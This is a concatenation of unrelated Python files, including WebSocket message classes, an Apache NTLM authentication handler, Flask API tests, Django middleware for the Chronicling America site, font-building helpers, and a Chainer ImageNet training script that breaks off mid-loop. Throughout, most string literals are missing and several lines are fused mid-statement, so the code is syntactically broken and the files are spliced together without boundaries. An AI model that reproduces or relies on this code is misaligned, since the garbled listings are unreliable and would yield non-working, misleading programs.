~~~ def __init__ ( self , text = None ) : \n 
~~~ Message . __init__ ( self , OPCODE_TEXT , text ) \n 
\n 
~~ @ property \n 
def is_binary ( self ) : \n 
~~~ return False \n 
\n 
~~ @ property \n 
def is_text ( self ) : \n 
~~~ return True \n 
\n 
~~ ~~ class BinaryMessage ( Message ) : \n 
~~~ def __init__ ( self , bytes = None ) : \n 
~~~ Message . __init__ ( self , OPCODE_BINARY , bytes , encoding = None ) \n 
\n 
~~ @ property \n 
def is_binary ( self ) : \n 
~~~ return True \n 
\n 
~~ @ property \n 
def is_text ( self ) : \n 
~~~ return False \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . data ) \n 
\n 
~~ ~~ class CloseControlMessage ( Message ) : \n 
~~~ def __init__ ( self , code = 1000 , reason = ) : \n 
~~~ data = b"" \n 
if code : \n 
~~~ data += struct . pack ( "!H" , code ) \n 
~~ if reason is not None : \n 
~~~ if isinstance ( reason , unicode ) : \n 
~~~ reason = reason . encode ( ) \n 
~~ data += reason \n 
\n 
~~ Message . __init__ ( self , OPCODE_CLOSE , data , ) \n 
self . code = code \n 
self . reason = reason \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if py3k : \n 
~~~ return self . reason . decode ( ) \n 
~~ return self . reason \n 
\n 
~~ def __unicode__ ( self ) : \n 
~~~ return self . reason . decode ( self . encoding ) \n 
\n 
~~ ~~ class PingControlMessage ( Message ) : \n 
~~~ def __init__ ( self , data = None ) : \n 
~~~ Message . __init__ ( self , OPCODE_PING , data ) \n 
\n 
~~ ~~ class PongControlMessage ( Message ) : \n 
~~~ def __init__ ( self , data ) : \n 
~~~ Message . __init__ ( self , OPCODE_PONG , data ) \n 
#!/usr/bin/env python \n 
# \n 
# PyAuthenNTLM2: A mod-python module for Apache that carries out NTLM authentication \n 
# \n 
# pyntlm.py \n 
# \n 
# Copyright 2011 Legrandin <helderijs@gmail.com> \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import sys \n 
import base64 \n 
import time \n 
import urllib \n 
from struct import unpack \n 
from threading import Lock \n 
from binascii import hexlify \n 
from urlparse import urlparse \n 
\n 
from mod_python import apache \n 
from PyAuthenNTLM2 . ntlm_dc_proxy import NTLM_DC_Proxy \n 
from PyAuthenNTLM2 . ntlm_ad_proxy import NTLM_AD_Proxy \n 
\n 
use_basic_auth = True \n 
try : \n 
~~~ from PyAuthenNTLM2 . ntlm_client import NTLM_Client \n 
~~ except ImportError : \n 
~~~ use_basic_auth = False \n 
\n 
# \n 
# A connection can be in one of the following states when a request arrives: \n 
# \n 
# 1 Freshly opened: no authentication step has taken place yet. \n 
\n 
\n 
# \n 
# 2 Pending authentication: we sent the NTLM challenge to the client, and we  \n 
#   are waiting for the response. req.connection.notes does not contain the \n 
\n 
\n 
# \n 
# 3 Authenticated: all steps completed successfully.  \n 
\n 
\n 
\n 
# \n 
# Since connections may be interrupted before receiving the challenge, objects older \n 
# than 60 seconds are removed from cache when we have the chance. \n 
\n 
~~ class CacheConnections : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . _mutex = Lock ( ) \n 
self . _cache = { } \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . _cache ) \n 
\n 
~~ def remove ( self , id ) : \n 
~~~ self . _mutex . acquire ( ) \n 
( proxy , ts ) = self . _cache . get ( id , ( None , None ) ) \n 
if proxy : \n 
~~~ proxy . close ( ) \n 
del self . _cache [ id ] \n 
~~ self . _mutex . release ( ) \n 
\n 
~~ def add ( self , id , proxy ) : \n 
~~~ self . _mutex . acquire ( ) \n 
self . _cache [ id ] = ( proxy , int ( time . time ( ) ) ) \n 
self . _mutex . release ( ) \n 
\n 
~~ def clean ( self ) : \n 
~~~ now = int ( time . time ( ) ) \n 
self . _mutex . acquire ( ) \n 
for id , conn in self . _cache . items ( ) : \n 
~~~ if conn [ 1 ] + 60 < now : \n 
~~~ conn [ 0 ] . close ( ) \n 
del self . _cache [ id ] \n 
~~ ~~ self . _mutex . release ( ) \n 
\n 
~~ def has_key ( self , id ) : \n 
~~~ return self . _cache . has_key ( id ) \n 
\n 
~~ def get_proxy ( self , id ) : \n 
~~~ self . _mutex . acquire ( ) \n 
proxy = self . _cache [ id ] [ 0 ] \n 
self . _mutex . release ( ) \n 
return proxy \n 
\n 
~~ ~~ class CacheGroups : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . _mutex = Lock ( ) \n 
self . _cache = { } \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . _cache ) \n 
\n 
~~ def add ( self , group , user ) : \n 
~~~ self . _mutex . acquire ( ) \n 
if not self . _cache . has_key ( group ) : \n 
~~~ self . _cache [ group ] = { } \n 
~~ self . _cache [ group ] [ user ] = int ( time . time ( ) ) \n 
self . _mutex . release ( ) \n 
\n 
~~ def clean ( self ) : \n 
~~~ now = int ( time . time ( ) ) \n 
self . _mutex . acquire ( ) \n 
old = [ ] \n 
for group , members in self . _cache . items ( ) : \n 
~~~ for user in members : \n 
~~~ if members [ user ] + 3 * 60 * 60 < now : \n 
~~~ old . append ( ( group , user ) ) \n 
~~ ~~ ~~ for group , user in old : \n 
~~~ del self . _cache [ group ] [ user ] \n 
~~ self . _mutex . release ( ) \n 
\n 
~~ def has ( self , group , user ) : \n 
~~~ if not self . _cache . has_key ( group ) : \n 
~~~ return False \n 
~~ return self . _cache [ group ] . has_key ( user ) \n 
\n 
~~ ~~ cache = CacheConnections ( ) \n 
cacheGroups = CacheGroups ( ) \n 
\n 
def ntlm_message_type ( msg ) : \n 
~~~ if not msg . startswith ( ) or len ( msg ) < 12 : \n 
~~~ raise RuntimeError ( "Not a valid NTLM message: \'%s\'" % hexlify ( msg ) ) \n 
~~ msg_type = unpack ( , msg [ 8 : 8 + 4 ] ) [ 0 ] \n 
if msg_type not in ( 1 , 2 , 3 ) : \n 
~~~ raise RuntimeError ( "Incorrect NTLM message Type: %d" % msg_type ) \n 
~~ return msg_type \n 
\n 
~~ def parse_ntlm_authenticate ( msg ) : \n 
~~~ \n 
\n 
NTLMSSP_NEGOTIATE_UNICODE = 0x00000001 \n 
idx = 28 \n 
length , offset = unpack ( , msg [ idx : idx + 8 ] ) \n 
domain = msg [ offset : offset + length ] \n 
idx += 8 \n 
length , offset = unpack ( , msg [ idx : idx + 8 ] ) \n 
username = msg [ offset : offset + length ] \n 
idx += 24 \n 
flags = unpack ( , msg [ idx : idx + 4 ] ) [ 0 ] \n 
if flags & NTLMSSP_NEGOTIATE_UNICODE : \n 
~~~ domain = str ( domain . decode ( ) ) \n 
username = str ( username . decode ( ) ) \n 
~~ return username , domain \n 
\n 
~~ def set_remote_user ( req , username , domain ) : \n 
~~~ format = req . get_options ( ) . get ( , ) . lower ( ) \n 
if format == : \n 
~~~ req . user = domain + + username \n 
~~ else : \n 
~~~ req . user = username \n 
\n 
~~ ~~ def decode_http_authorization_header ( auth ) : \n 
~~~ \n 
ah = auth . split ( ) \n 
if len ( ah ) == 2 : \n 
~~~ b64 = base64 . b64decode ( ah [ 1 ] ) \n 
if ah [ 0 ] == : \n 
~~~ return ( , b64 ) \n 
~~ elif ah [ 0 ] == and use_basic_auth : \n 
~~~ ( user , password ) = b64 . split ( ) \n 
return ( , user , password ) \n 
~~ ~~ return False \n 
\n 
~~ def handle_unauthorized ( req ) : \n 
~~~ \n 
\n 
req . err_headers_out . add ( , ) \n 
if use_basic_auth : \n 
~~~ req . err_headers_out . add ( , \'Basic realm="%s"\' % req . auth_name ( ) ) \n 
~~ req . err_headers_out . add ( , ) \n 
return apache . HTTP_UNAUTHORIZED \n 
\n 
~~ def connect_to_proxy ( req , type1 ) : \n 
~~~ \n 
\n 
# Get configuration entries in Apache file \n 
try : \n 
~~~ domain = req . get_options ( ) [ ] \n 
pdc = req . get_options ( ) [ ] \n 
bdc = req . get_options ( ) . get ( , False ) \n 
~~ except KeyError , e : \n 
~~~ req . log_error ( % str ( e ) , apache . APLOG_CRIT ) raise \n 
~~ ntlm_challenge = None \n 
for server in ( pdc , bdc ) : \n 
~~~ if not server : continue \n 
try : \n 
~~~ if server . startswith ( ) : \n 
~~~ url = urlparse ( server ) \n 
decoded_path = urllib . unquote ( url . path ) [ 1 : ] \n 
req . log_error ( \'PYTNLM: Initiating connection to Active Directory server %s (domain %s) using base DN "%s".\' ( url . netloc , domain , decoded_path ) , apache . APLOG_INFO ) \n 
proxy = NTLM_AD_Proxy ( url . netloc , domain , base = decoded_path ) \n 
~~ else : \n 
~~~ req . log_error ( ( server , domain ) , apache . APLOG_INFO ) \n 
proxy = NTLM_DC_Proxy ( server , domain ) \n 
~~ ntlm_challenge = proxy . negotiate ( type1 ) \n 
~~ except Exception , e : \n 
~~~ req . log_error ( % ( server ~~ if ntlm_challenge : break \n 
proxy . close ( ) \n 
~~ else : \n 
~~~ raise RuntimeError ( "None of the Domain Controllers are available." ) \n 
~~ return ( proxy , ntlm_challenge ) \n 
\n 
~~ def handle_type1 ( req , ntlm_message ) : \n 
~~~ \n 
cache . remove ( req . connection . id ) \n 
cache . clean ( ) \n 
\n 
try : \n 
~~~ ( proxy , ntlm_challenge ) = connect_to_proxy ( req , ntlm_message ) \n 
~~ except Exception , e : \n 
~~~ return apache . HTTP_INTERNAL_SERVER_ERROR \n 
\n 
~~ cache . add ( req . connection . id , proxy ) \n 
req . err_headers_out . add ( , "NTLM " + base64 . b64encode ( ntlm_challenge ) ) \n 
return apache . HTTP_UNAUTHORIZED \n 
\n 
~~ def check_authorization ( req , username , proxy ) : \n 
~~~ \n 
\n 
rules = . join ( req . requires ( ) ) . strip ( ) \n 
if rules == or cacheGroups . has ( rules , username ) : \n 
~~~ return True \n 
~~ groups = [ ] \n 
for r in req . requires ( ) : \n 
~~~ if r . lower ( ) . startswith ( "user " ) : \n 
~~~ users = [ u . strip ( ) for u in r [ 5 : ] . split ( "," ) ] \n 
if username in users : \n 
~~~ req . log_error ( % \n 
( username , req . unparsed_uri ) , apache . APLOG_INFO ) \n 
return True \n 
~~ ~~ if r . lower ( ) . startswith ( "group " ) : \n 
~~~ groups += [ g . strip ( ) for g in r [ 6 : ] . split ( "," ) ] \n 
\n 
~~ ~~ if groups : \n 
~~~ try : \n 
~~~ res = proxy . check_membership ( username , groups ) \n 
~~ except Exception , e : \n 
~~~ req . log_error ( ~~ if res : \n 
\n 
~~~ cacheGroups . add ( rules , username ) \n 
\n 
req . log_error ( % \n 
( username , str ( groups ) , req . unparsed_uri ) , apache . APLOG_INFO ) \n 
return True \n 
~~ req . log_error ( % \n 
( username , str ( groups ) , req . unparsed_uri ) ) \n 
~~ else : \n 
~~~ req . log_error ( % \n 
( username , req . unparsed_uri ) ) \n 
~~ return False \n 
\n 
~~ def handle_type3 ( req , ntlm_message ) : \n 
~~~ \n 
\n 
proxy = cache . get_proxy ( req . connection . id ) \n 
try : \n 
~~~ user , domain = parse_ntlm_authenticate ( ntlm_message ) \n 
if not domain : \n 
~~~ domain = req . get_options ( ) . get ( , req . auth_name ( ) ) \n 
~~ result = proxy . authenticate ( ntlm_message ) \n 
~~ except Exception , e : \n 
~~~ req . log_error ( % str ( e ) , apache user , domain = , \n 
result = False \n 
~~ if not result : \n 
~~~ cache . remove ( req . connection . id ) \n 
req . log_error ( % ( \n 
domain , user , req . unparsed_uri ) ) \n 
return handle_unauthorized ( req ) \n 
\n 
~~ req . log_error ( % ( user , domain , req . unparsed_uri set_remote_user ( req , user , domain ) \n 
result = check_authorization ( req , user , proxy ) \n 
cache . remove ( req . connection . id ) \n 
\n 
if not result : \n 
~~~ return apache . HTTP_FORBIDDEN \n 
\n 
~~ req . connection . notes . add ( , req . user ) \n 
return apache . OK \n 
\n 
~~ def handle_basic ( req , user , password ) : \n 
~~~ \n 
req . log_error ( % ( req . unparsed_uri ) ) \n 
\n 
domain = req . get_options ( ) . get ( , req . auth_name ( ) ) \n 
client = NTLM_Client ( user , domain , password ) \n 
type1 = client . make_ntlm_negotiate ( ) \n 
\n 
try : \n 
~~~ ( proxy , type2 ) = connect_to_proxy ( req , type1 ) \n 
~~ except Exception , e : \n 
~~~ return apache . HTTP_INTERNAL_SERVER_ERROR \n 
\n 
~~ client . parse_ntlm_challenge ( type2 ) \n 
type3 = client . make_ntlm_authenticate ( ) \n 
if not proxy . authenticate ( type3 ) : \n 
~~~ proxy . close ( ) \n 
req . log_error ( % ( \n 
user , domain , req . unparsed_uri ) ) \n 
return handle_unauthorized ( req ) \n 
\n 
~~ req . log_error ( % ( user , domain set_remote_user ( req , user , domain ) \n 
result = check_authorization ( req , user , proxy ) \n 
proxy . close ( ) \n 
\n 
if not result : \n 
~~~ return apache . HTTP_FORBIDDEN \n 
\n 
~~ req . connection . notes . add ( , user + password ) \n 
return apache . OK \n 
\n 
~~ def authenhandler ( req ) : \n 
~~~ \n 
req . log_error ( "PYNTLM: Handling connection 0x%X for %s URI %s. %d entries in connection cache." req . connection . id , req . method , req . unparsed_uri , len ( cache ) ) , apache . APLOG_INFO ) \n 
\n 
# Extract Authorization header, as a list (if present) \n 
auth_headers = req . headers_in . get ( , [ ] ) \n 
if not isinstance ( auth_headers , list ) : \n 
~~~ auth_headers = [ auth_headers ] \n 
\n 
# If this connection was authenticated with NTLM, quit immediately with an OK \n 
# (unless it comes from IE). \n 
~~ user = req . connection . notes . get ( , None ) \n 
if user : \n 
~~~ req . user = user \n 
# Internet Explorer sends a Type 1 authorization request with an empty \n 
# POST, even if the connection is already authenticated. \n 
\n 
# NTLM_AUTHORIZED key from connection.notes), but we still let a new \n 
# challenge-response exchange take place. \n 
# For other methods, it is acceptable to return OK immediately. \n 
if auth_headers : \n 
~~~ req . log_error ( req . connection . id , req . method , req . clength , auth_headers ) , apache . APLOG_INFO ) \n 
if req . method != or req . clength > 0 : \n 
~~~ return apache . OK \n 
~~ ~~ else : \n 
~~~ return apache . OK \n 
\n 
# If there is no Authorization header it means it is the first request. \n 
# We reject it with a 401, indicating which authentication protocol we understand. \n 
~~ ~~ if not auth_headers : \n 
~~~ return handle_unauthorized ( req ) \n 
\n 
# Extract authentication data from any of the Authorization headers \n 
~~ try : \n 
~~~ for ah in auth_headers : \n 
~~~ ah_data = decode_http_authorization_header ( ah ) \n 
if ah_data : \n 
~~~ break \n 
~~ ~~ ~~ except : \n 
~~~ ah_data = False \n 
\n 
~~ if not ah_data : \n 
~~~ req . log_error ( % req . unparsed_uri , apache return apache . HTTP_BAD_REQUEST \n 
\n 
~~ if ah_data [ 0 ] == : \n 
# If this connection was authenticated with Basic, verify that the \n 
# credentials match and return 200 (if they do) or 401 (if they \n 
\n 
~~~ userpwd = req . connection . notes . get ( , None ) \n 
if userpwd : \n 
~~~ if userpwd != ah_data [ 1 ] + ah_data [ 2 ] : \n 
~~~ return handle_unauthorized ( req ) \n 
~~ domain = req . get_options ( ) . get ( , req . auth_name ( ) ) \n 
set_remote_user ( req , ah_data [ 1 ] , domain ) \n 
return apache . OK \n 
# Connection was not authenticated before \n 
~~ return handle_basic ( req , ah_data [ 1 ] , ah_data [ 2 ] ) \n 
\n 
# If we get here it means that there is an Authorization header, with an \n 
# NTLM message in it. Moreover, the connection needs to be (re)authenticated. \n 
# Most likely, the NTLM message is of: \n 
# - Type 1 (and there is nothing in the cache): the client wants to \n 
#   authenticate for the first time, \n 
# - Type 3 (and there is something in the cache): the client wants to finalize \n 
#   a pending authentication request. \n 
# \n 
# However, it could still be that there is a Type 3 and nothing in the \n 
# cache (the final client message was erroneously routed to a new connection), \n 
# or that there is a Type 1 with something in the cache (the client wants to \n 
# initiate an cancel a pending authentication). \n 
\n 
~~ try : \n 
~~~ ntlm_version = ntlm_message_type ( ah_data [ 1 ] ) \n 
if ntlm_version == 1 : \n 
~~~ return handle_type1 ( req , ah_data [ 1 ] ) \n 
~~ if ntlm_version == 3 : \n 
~~~ if cache . has_key ( req . connection . id ) : \n 
~~~ return handle_type3 ( req , ah_data [ 1 ] ) \n 
~~ req . log_error ( % \n 
( req . unparsed_uri ) , apache . APLOG_INFO ) \n 
return handle_unauthorized ( req ) \n 
~~ error = \n 
~~ except Exception , e : \n 
~~~ error = str ( e ) \n 
~~ req . log_error ( % \n 
( req . unparsed_uri , error ) , apache . APLOG_ERR ) \n 
return apache . HTTP_BAD_REQUEST \n 
\n 
# coding: utf-8 \n 
~~ from celery import Celery \n 
\n 
\n 
def create_celery_app ( app ) : \n 
~~~ if app . config . get ( ) : \n 
~~~ app . celery = Celery ( __name__ , broker = app . config [ ] ) \n 
app . celery . conf . update ( app . config ) \n 
taskbase = app . celery . Task \n 
\n 
class ContextTask ( taskbase ) : \n 
~~~ abstract = True \n 
\n 
# make it within flask context \n 
def __call__ ( self , * args , ** kwargs ) : \n 
~~~ with app . app_context ( ) : \n 
~~~ return taskbase . __call__ ( self , * args , ** kwargs ) \n 
\n 
~~ ~~ ~~ app . celery . Task = ContextTask \n 
# http://werkzeug.pocoo.org/docs/0.11/test/#werkzeug.test.Client \n 
# http://flask.pocoo.org/docs/0.10/api/#test-client \n 
\n 
~~ ~~ import unittest \n 
import os \n 
import sys \n 
import json \n 
\n 
# Add app path to module path \n 
sys . path . append ( os . path . dirname ( os . path . realpath ( __file__ ) . rsplit ( , 2 ) [ 0 ] ) ) \n 
from app import create_app \n 
#from app.users.models import Users \n 
\n 
\n 
app = create_app ( ) \n 
add_data = """{\n  "data": {\n    "attributes":\n\n    {"active": "true", "role": "test string", "password": "test string", "creation_time": "2015-12-22T03:12:58.019077+00:00", "modification_time": "2015-12-22T03:12:58.019077+00:00", "email": "testing@flask.pocoo.com", "name": "test string"}\n         ,\n\n    "type": "users"\n  }\n\n}""" \n 
\n 
update_data = """{\n  "data": {\n    "attributes":\n\n        {"active": "false", "role": "test string", "password": "test string", "creation_time": "2015-12-22T03:12:58.019077+00:00", "modification_time": "2015-12-22T03:12:58.019077+00:00", "email": "testing@flask.pocoo.com", "name": "test string"},\n    "type": "users"\n  }\n\n}""" \n 
\n 
\n 
class TestUsers ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ self . app = app . test_client ( ) \n 
\n 
~~ def test_01_add ( self ) : \n 
\n 
~~~ rv = self . app . post ( , data = add_data , \n 
content_type = "application/json" ) \n 
assert rv . status_code == 201 \n 
\n 
~~ def test_02_read_update ( self ) : \n 
~~~ request = self . app . get ( ) \n 
dict = json . loads ( request . data . decode ( ) ) \n 
id = dict [ ] [ 0 ] [ ] \n 
rv = self . app . patch ( . format ( id ) , \n 
data = update_data , content_type = "application/json" ) \n 
assert rv . status_code == 200 \n 
\n 
~~ def test_03_delete ( self ) : \n 
~~~ request = self . app . get ( ) \n 
dict = json . loads ( request . data . decode ( ) ) \n 
id = dict [ ] [ 0 ] [ ] \n 
rv = self . app . delete ( . format ( id ) ) \n 
assert rv . status_code == 204 \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
\n 
~~ """ These are some UFO specific tools for use with Mutator.\n\n\n\tbuild() is a convenience function for reading and executing a designspace file.\n\t\tdocumentPath: \t\t\t\tfilepath to the .designspace document\n\t\toutputUFOFormatVersion:\t\tufo format for output\n\t\tverbose:\t\t\t\t\tTrue / False for lots or no feedback\n\t\tlogPath:\t\t\t\t\tfilepath to a log file\n\t\tprogressFunc:\t\t\t\tan optional callback to report progress.\n\t\t\t\t\t\t\t\t\tsee mutatorMath.ufo.tokenProgressFunc\n\n""" \n 
\n 
\n 
def tokenProgressFunc ( state = "update" , action = None , text = None , tick = 0 ) : \n 
~~~ """\n\t\tstate: \t\tstring, "update", "reading sources", "wrapping up"\n\t\taction:\t\tstring, "stop", "start"\n\t\ttext:\t\tstring, value, additional parameter. For instance ufoname.\n\t\ttick:\t\ta float between 0 and 1 indicating progress.\n\t""" \n 
print ( "tokenProgressFunc %s: %s\\n%s (%d)" % ( state , str ( title ) , str ( text ) , str ( tick ) ) ) \n 
\n 
~~ def build ( \n 
documentPath , \n 
outputUFOFormatVersion = 2 , \n 
roundGeometry = True , \n 
verbose = True , \n 
logPath = None , \n 
progressFunc = None , \n 
) : \n 
~~~ """\n\n\t\tSimple builder for UFO designspaces.\n\n\t""" \n 
from mutatorMath . ufo . document import DesignSpaceDocumentReader \n 
import os , glob \n 
if os . path . isdir ( documentPath ) : \n 
# process all *.designspace documents in this folder \n 
~~~ todo = glob . glob ( os . path . join ( documentPath , "*.designspace" ) ) \n 
~~ else : \n 
# process the  \n 
~~~ todo = [ documentPath ] \n 
~~ results = [ ] \n 
for path in todo : \n 
~~~ reader = DesignSpaceDocumentReader ( \n 
path , \n 
ufoVersion = outputUFOFormatVersion , \n 
roundGeometry = roundGeometry , \n 
verbose = verbose , \n 
logPath = logPath , \n 
progressFunc = progressFunc \n 
) \n 
reader . process ( ) \n 
results . append ( reader . results ) \n 
~~ reader = None \n 
return results \n 
\n 
~~ from django . core . management . base import BaseCommand \n 
\n 
from chronam . core . management . commands import configure_logging \n 
from chronam . core . index import index_pages \n 
\n 
configure_logging ( "index_pages_logging.config" , "index_pages.log" ) \n 
\n 
class Command ( BaseCommand ) : \n 
\n 
~~~ def handle ( self , ** options ) : \n 
~~~ index_pages ( ) \n 
~~ ~~ import os \n 
\n 
from django . conf import settings \n 
from django . http import HttpResponse \n 
\n 
\n 
class HttpResponseServiceUnavailable ( HttpResponse ) : \n 
~~~ status_code = 503 \n 
\n 
\n 
~~ class TooBusyMiddleware ( object ) : \n 
\n 
~~~ def process_request ( self , request ) : \n 
~~~ one , five , fifteen = os . getloadavg ( ) \n 
if one > settings . TOO_BUSY_LOAD_AVERAGE : \n 
~~~ return HttpResponseServiceUnavailable ( """\n<!doctype html>\n<html>\n<head>\n  <meta charset="utf-8">\n  <title>Server Too Busy - Chronicling America - Chronicling America (The Library of Congress)</title> \n  <style></style>\n</head>\n<body>\n     <article>\n\t  <h1>Server Too Busy</h1>\n\t   <div>\n            <p>The Chronicling America server is currently too busy to serve your request. Please try your request again shortly.</p>\n            <p><a href="http://www.loc.gov/pictures/resource/ppmsc.01752/"><img src="http://lcweb2.loc.gov/service/pnp/ppmsc/01700/01752r.jpg"/></a></p>\n\t   </div>\n     </article>\n</body>\n</html>\n""" ) \n 
~~ return None \n 
~~ ~~ from os . path import dirname , join \n 
\n 
from django . test import TestCase \n 
\n 
from chronam . core . ocr_extractor import ocr_extractor \n 
\n 
\n 
class OcrExtractorTests ( TestCase ) : \n 
\n 
~~~ def test_extractor ( self ) : \n 
~~~ dir = join ( dirname ( dirname ( __file__ ) ) , ) \n 
ocr_file = join ( dir , ) \n 
text , coord_info = ocr_extractor ( ocr_file ) \n 
coords = coord_info [ "coords" ] \n 
expected_text = { "eng" : file ( join ( dir , ) ) . read ( ) . decode ( ) } \n 
\n 
self . assertEqual ( text , expected_text ) \n 
self . assertEqual ( len ( coords . keys ( ) ) , 2150 ) \n 
self . assertEqual ( len ( coords [ ] ) , 3 ) \n 
# Craft. should be normalized to Craft \n 
\n 
# trailing punctuation in highlighted text \n 
self . assertTrue ( coords . has_key ( ) ) \n 
self . assertTrue ( not coords . has_key ( ) ) \n 
#!/usr/bin/env python \n 
# -*- coding:  utf-8 -*- \n 
~~ ~~ """\nhuman_curl.debug\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nDebuggging tests for human_curl\n\n:copyright: (c) 2011 by Alexandr Lispython (alex@obout.ru).\n:license: BSD, see LICENSE for more details.\n""" \n 
\n 
import logging \n 
from . tests import * \n 
\n 
\n 
logger = logging . getLogger ( "human_curl" ) \n 
logger . setLevel ( logging . DEBUG ) \n 
\n 
# Add the log message handler to the logger \n 
# LOG_FILENAME = os.path.join(os.path.dirname(__file__), "debug.log") \n 
# handler = logging.handlers.FileHandler(LOG_FILENAME) \n 
handler = logging . StreamHandler ( ) \n 
\n 
formatter = logging . Formatter ( "%(levelname)s %(asctime)s %(module)s [%(lineno)d] %(process)d %(thread)d | %(message)s " \n 
handler . setFormatter ( formatter ) \n 
\n 
logger . addHandler ( handler ) \n 
#!/usr/bin/env python \n 
"""Example code of learning a large scale convnet from ILSVRC2012 dataset.\n\nPrerequisite: To run this example, crop the center of ILSVRC2012 training and\nvalidation images and scale them to 256x256, and make two lists of space-\nseparated CSV whose first column is full path to image and second column is\nzero-origin label (this format is same as that used by Caffe\'s ImageDataLayer).\n\n""" \n 
from __future__ import print_function \n 
import argparse \n 
import datetime \n 
import json \n 
import multiprocessing \n 
import os \n 
import random \n 
import sys \n 
import threading \n 
import time \n 
\n 
import numpy as np \n 
from PIL import Image \n 
import six \n 
import six . moves . cPickle as pickle \n 
from six . moves import queue \n 
\n 
import chainer \n 
from chainer import computational_graph \n 
from chainer import cuda \n 
from chainer import optimizers \n 
from chainer import serializers \n 
\n 
\n 
parser = argparse . ArgumentParser ( \n 
description = ) \n 
parser . add_argument ( , help = ) \n 
parser . add_argument ( , help = ) \n 
parser . add_argument ( , , default = , \n 
help = ) \n 
parser . add_argument ( , , default = , \n 
help = ) \n 
parser . add_argument ( , , type = int , default = 32 , \n 
help = ) \n 
parser . add_argument ( , , type = int , default = 250 , \n 
help = ) \n 
parser . add_argument ( , , default = 10 , type = int , \n 
help = ) \n 
parser . add_argument ( , , default = - 1 , type = int , \n 
help = ) \n 
parser . add_argument ( , , default = 20 , type = int , \n 
help = ) \n 
parser . add_argument ( , , default = , \n 
help = ) \n 
parser . add_argument ( , , default = , \n 
help = ) \n 
parser . add_argument ( , , default = , \n 
help = ) \n 
parser . add_argument ( , default = , \n 
help = ) \n 
parser . add_argument ( , default = , \n 
help = ) \n 
args = parser . parse_args ( ) \n 
if args . gpu >= 0 : \n 
~~~ cuda . check_cuda_available ( ) \n 
~~ xp = cuda . cupy if args . gpu >= 0 else np \n 
\n 
assert 50000 % args . val_batchsize == 0 \n 
\n 
\n 
def load_image_list ( path , root ) : \n 
~~~ tuples = [ ] \n 
for line in open ( path ) : \n 
~~~ pair = line . strip ( ) . split ( ) \n 
tuples . append ( ( os . path . join ( root , pair [ 0 ] ) , np . int32 ( pair [ 1 ] ) ) ) \n 
~~ return tuples \n 
\n 
# Prepare dataset \n 
~~ train_list = load_image_list ( args . train , args . root ) \n 
val_list = load_image_list ( args . val , args . root ) \n 
mean_image = pickle . load ( open ( args . mean , ) ) \n 
\n 
# Prepare model \n 
if args . arch == : \n 
~~~ import nin \n 
model = nin . NIN ( ) \n 
~~ elif args . arch == : \n 
~~~ import alex \n 
model = alex . Alex ( ) \n 
~~ elif args . arch == : \n 
~~~ import alexbn \n 
model = alexbn . AlexBN ( ) \n 
~~ elif args . arch == : \n 
~~~ import googlenet \n 
model = googlenet . GoogLeNet ( ) \n 
~~ elif args . arch == : \n 
~~~ import googlenetbn \n 
model = googlenetbn . GoogLeNetBN ( ) \n 
~~ else : \n 
~~~ raise ValueError ( ) \n 
\n 
~~ if args . gpu >= 0 : \n 
~~~ cuda . get_device ( args . gpu ) . use ( ) \n 
model . to_gpu ( ) \n 
\n 
# Setup optimizer \n 
~~ optimizer = optimizers . MomentumSGD ( lr = 0.01 , momentum = 0.9 ) \n 
optimizer . setup ( model ) \n 
\n 
# Init/Resume \n 
if args . initmodel : \n 
~~~ print ( , args . initmodel ) \n 
serializers . load_hdf5 ( args . initmodel , model ) \n 
~~ if args . resume : \n 
~~~ print ( , args . resume ) \n 
serializers . load_hdf5 ( args . resume , optimizer ) \n 
\n 
\n 
# ------------------------------------------------------------------------------ \n 
# This example consists of three threads: data feeder, logger and trainer. \n 
# These communicate with each other via Queue. \n 
~~ data_q = queue . Queue ( maxsize = 1 ) \n 
res_q = queue . Queue ( ) \n 
\n 
cropwidth = 256 - model . insize \n 
\n 
\n 
def read_image ( path , center = False , flip = False ) : \n 
# Data loading routine \n 
~~~ image = np . asarray ( Image . open ( path ) ) . transpose ( 2 , 0 , 1 ) \n 
if center : \n 
~~~ top = left = cropwidth / 2 \n 
~~ else : \n 
~~~ top = random . randint ( 0 , cropwidth - 1 ) \n 
left = random . randint ( 0 , cropwidth - 1 ) \n 
~~ bottom = model . insize + top \n 
right = model . insize + left \n 
\n 
image = image [ : , top : bottom , left : right ] . astype ( np . float32 ) \n 
image -= mean_image [ : , top : bottom , left : right ] \n 
image /= 255 \n 
if flip and random . randint ( 0 , 1 ) == 0 : \n 
~~~ return image [ : , : , : : - 1 ] \n 
~~ else : \n 
~~~ return image \n 
\n 
\n 
~~ ~~ def feed_data ( ) : \n 
# Data feeder \n 
~~~ i = 0 \n 
count = 0 \n 
\n 
x_batch = np . ndarray ( \n 
( args . batchsize , 3 , model . insize , model . insize ) , dtype = np . float32 ) \n 
y_batch = np . ndarray ( ( args . batchsize , ) , dtype = np . int32 ) \n 
val_x_batch = np . ndarray ( \n 
( args . val_batchsize , 3 , model . insize , model . insize ) , dtype = np . float32 ) \n 
val_y_batch = np . ndarray ( ( args . val_batchsize , ) , dtype = np . int32 ) \n 
\n 
batch_pool = [ None ] * args . batchsize \n 
val_batch_pool = [ None ] * args . val_batchsize \n 
pool = multiprocessing . Pool ( args . loaderjob ) \n 
data_q . put ( ) \n 
for epoch in six . moves . range ( 1 , 1 + args . epoch ) : \n 
~~~ print ( , epoch , file = sys . stderr ) \n 
print ( , optimizer . lr , file = sys . stderr ) \n 
perm = np . random . permutation ( len ( train_list ) ) \n 
for idx in perm : \n 
